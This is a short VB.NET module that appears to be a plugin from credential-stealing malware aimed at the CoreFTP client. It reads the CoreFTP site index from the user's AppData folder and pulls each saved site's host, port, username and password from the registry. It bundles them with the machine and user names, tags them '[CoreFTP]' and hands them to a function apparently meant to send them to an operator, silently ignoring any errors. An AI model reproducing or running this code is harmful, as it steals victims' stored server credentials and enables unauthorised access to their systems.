Imports Microsoft.VisualBasic
Module CoreFTP
    Sub CoreFTP()
        Dim sPath As String = Environ$("APPDATA") & "\CoreFTP\sites.idx"
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Host")
        Dim sPort As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Port")
        Dim sUser As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\User")
        Dim sPwd As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\PW")
        Dim sEntry As String = RegRead("HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" & sFile & "\Name")

        If Not sUser = "" Then
            Try
                SendMiscCommandRecover(Environment.MachineName & "/" & Environment.UserName & "|(" & sEntry & ")" & sHost & ":" & sPort & "|" & sUser & "|" & sPwd & "|" & 0 & "|[CoreFTP]")
            Catch ex As Exception
            End Try
        Else
        End If
    End Sub

    Public Function ReadFile(ByVal sFile As String) As String
        On Error Resume Next
        Dim OpenFile As New System.IO.StreamReader(sFile)
        ReadFile = OpenFile.ReadToEnd.ToString
    End Function
End Module
